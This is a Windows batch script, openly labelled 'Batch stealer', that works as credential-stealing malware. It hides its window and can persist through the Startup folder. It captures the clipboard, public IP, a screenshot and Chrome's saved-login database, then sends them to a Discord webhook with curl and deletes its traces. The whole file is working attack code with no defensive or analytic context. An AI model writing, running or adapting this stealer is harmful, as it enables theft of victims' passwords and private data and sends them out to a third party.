@echo off

:: Set your discord webhook
set webhook=

:: Everyone ? True/False
set everyone=True

:: Launch at computer startup True/False
:: Beta
set startup=False

:: Minimize the window at startup
set file_name=%~nx0
set scriptPath=%~dp0%~nx0
if not exist "%appdata%\011.011.txt" echo. > %appdata%\011.011.txt & start /MIN %scriptPath% & exit
del /F "%appdata%\011.011.txt"

:: Launch at startup if True
set startupFolder=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
if %startup%==True copy "%scriptPath%" "%startupFolder%"

:: Set steal ID
set id=%random%

:: Delete all files
call :delete_files >nul

:: Get clipboard
setlocal
for /f "delims=" %%i in ('powershell -command "Get-Clipboard"') do set "clipboard=%%i"

:: Get ip
setlocal
for /f "delims=" %%i in ('nslookup myip.opendns.com resolver1.opendns.com 2^>nul ^| find "Address:"') do set "myip=%%i"
set ip=%myip:~10%

:: Screenshot
set filename=screenshot.png
set folder=%appdata%
cd %folder%
powershell -command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); $img.Save('%filename%');}"

:: Get time
set realtime=%time:~0,2%:%time:~3,2%:%time:~6,2%

:: Get pwd
COPY "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%appdata%/pwd.txt" >nul


:: Send all informations
:: > Ping everyone if it's True
if %everyone%==True curl -X POST -H "Content-type: application/json" --data "{\"username\": \"Batch stealer\", \"content\": \"@everyone\", \"avatar_url\":\"https://i.imgur.com/yhEjpSJ.png\"}" %webhook% --ssl-no-revoke -L -O >nul
:: > User, Ip, time, date, os and computername
curl -X POST -H "Content-type: application/json" --data "{\"username\": \"Batch stealer\", \"content\": \"```cs\n#New information:``` ```User = %username%\nIp = %ip%\nos = %os%\nComputername = %computername%\nClipboard = %Clipboard%\ntime =  %realtime%\ndate = %date%\nId = %id% ```\", \"avatar_url\":\"https://i.imgur.com/yhEjpSJ.png\"}" %webhook% --ssl-no-revoke -L -O >nul
:: > Send screenshot
curl -k -F "payload_json={\"username\": \"Batch stealer\", \"content\": \"```New screen found (%id%):```\"}" -F file=@%appdata%/screenshot.png %webhook% --ssl-no-revoke -L -O >nul
:: > Send chrome crypted passwords
curl -k -F "payload_json={\"username\": \"Batch stealer\", \"content\": \"```New chrome passwords found (%id%):```\"}" -F file=@%appdata%/pwd.txt %webhook% --ssl-no-revoke -L -O >nul

call :delete_files
exit

:: Delete all files
:delete_files
del /F "%appdata%\screenshot.png" >nul
del /F "%appdata%\pwd.txt" >nul
goto :eof